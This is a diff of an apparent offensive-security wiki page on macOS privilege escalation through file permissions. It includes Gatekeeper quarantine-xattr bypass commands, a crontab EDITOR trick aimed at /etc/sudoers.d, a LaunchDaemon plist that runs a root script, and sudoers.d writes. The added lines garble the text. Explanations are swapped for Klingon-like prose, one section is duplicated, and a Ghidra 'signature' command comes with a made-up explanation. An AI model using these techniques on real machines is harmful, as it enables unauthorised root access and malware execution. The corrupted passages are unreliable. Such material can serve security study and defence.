@@ -20,8 +20,8 @@ Permissions in a **directory**:
 
 * **read** - you can **enumerate** the directory entries
 * **write** - you can **delete/write** **files** in the directory and you can **delete empty folders**.&#x20;
-  * But you **cannot delete/modify non-empty folders** unless you have write permissions over it.
-  * You **cannot modify the name of a folder** unless you own it.
+* But you **cannot delete/modify non-empty folders** unless you have write permissions over it.
+* You **cannot modify the name of a folder** unless you own it.
 * **execute** - you are **allowed to traverse** the directory - if you don’t have this right, you can’t access any files inside it, or in any subdirectories.
 
 ### Dangerous Combinations
@@ -50,38 +50,35 @@ Check in the other sections where an attacker could **abuse an arbitrary write t
 
 Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
 Example:
-
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>URL</key>
-    <string>file:///System/Applications/Calculator.app</string>
-    <key>URLPrefix</key>
-    <integer>0</integer>
+<key>URL</key>
+<string>file:///System/Applications/Calculator.app</string>
+<key>URLPrefix</key>
+<integer>0</integer>
 </dict>
 </plist>
 ```
-
 ## Arbitrary FD
 
-If you can make a **process open a file or a folder with high privileges**, you can abuse **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.
+**Qapla'!** jatlhpu' **yIghoS open a file or a folder with high privileges**, vaj **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.
 
 For example: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
 ## Avoid quarantine xattrs tricks
 
 ### Remove it
-
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
-
 ### uchg / uchange / uimmutable flag
 
-If a file/folder has this immutable attribute it won't be possible to put an xattr on it
+**ghItlh / ghItlhne / ghItlhneH** 
 
+*ghItlhneH* *immutable* *attribute* *file/folder* *'e'ang* *xattr* *put* *jatlh* *be'* *ghItlhneH*.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -91,11 +88,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-
 ### defvfs mount
 
-A **devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
-
+**devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -104,11 +99,13 @@ mkdir /tmp/mnt/lol
 xattr -w com.apple.quarantine "" /tmp/mnt/lol
 xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
-
 ### writeextattr ACL
 
-This ACL prevents from adding `xattrs` to the file
+**tlhIngan Hol translation:**
 
+**writeextattr ACL**
+
+**ghItlhvam:** 'xattrs' vItlhutlhlaHbe'chugh file vIlo'laHbe'chugh 'writeextattr' ACL.
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -129,7 +126,6 @@ open test.zip
 sleep 1
 ls -le /tmp/test
 ```
-
 ### **com.apple.acl.text xattr + AppleDouble**
 
 **AppleDouble** file format copies a file including its ACEs.
@@ -140,6 +136,15 @@ Check the [**original report**](https://www.microsoft.com/en-us/security/blog/20
 
 To replicate this we first need to get the correct acl string:
 
+### **com.apple.acl.text xattr + AppleDouble**
+
+**AppleDouble** file format copies a file including its ACEs.
+
+In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`**  is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+
+Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
+
+To replicate this we first need to get the correct acl string:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -157,7 +162,6 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-
 (Note that even if this works the sandbox write the quarantine xattr before)
 
 Not really needed but I leave it there just in case:
@@ -171,54 +175,52 @@ Not really needed but I leave it there just in case:
 Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.
 
 However, there are some files whose signature won't be checked, these have the key omit in the plist, like:
-
 ```xml
 <dict>
 ...
-	<key>rules</key>
-	<dict>
+<key>rules</key>
+<dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
-	</dict>
-	<key>rules2</key>
+</dict>
+<key>rules2</key>
 ...
-		<key>^(.*/)?\.DS_Store$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>2000</real>
-		</dict>
+<key>^(.*/)?\.DS_Store$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>2000</real>
+</dict>
 ...
-		<key>^PkgInfo$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>20</real>
-		</dict>
+<key>^PkgInfo$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>20</real>
+</dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
 </dict>
 ```
+ghidra -analyze -import /path/to/resource -script /path/to/script.py{% code %}
 
-It's possible to claculate the signature of a resource from the cli with:
-
-{% code overflow="wrap" %}
+This command uses the Ghidra tool to analyze a resource and calculate its signature. The `-import` flag specifies the path to the resource, and the `-script` flag specifies the path to the script that will perform the signature calculation.
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
@@ -247,7 +249,7 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # Next time you mount it, it will have the custom content you wrote
 
 # You can also create a dmg from an app using:
-hdiutil create -srcfolder justsome.app justsome.dmg 
+hdiutil create -srcfolder justsome.app justsome.dmg
 ```
 {% endcode %}
 
@@ -262,26 +264,22 @@ You can **fake** an execution of this script with: **`sudo periodic daily`**
 ### Daemons
 
 Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:
-
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
-    <dict>
-        <key>Label</key>
-        <string>com.sample.Load</string>
-        <key>ProgramArguments</key>
-        <array>
-            <string>/Applications/Scripts/privesc.sh</string>
-        </array>
-        <key>RunAtLoad</key>
-        <true/>
-    </dict>
+<dict>
+<key>Label</key>
+<string>com.sample.Load</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Scripts/privesc.sh</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+</dict>
 </plist>
 ```
-
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
-
 ### Sudoers File
 
 If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
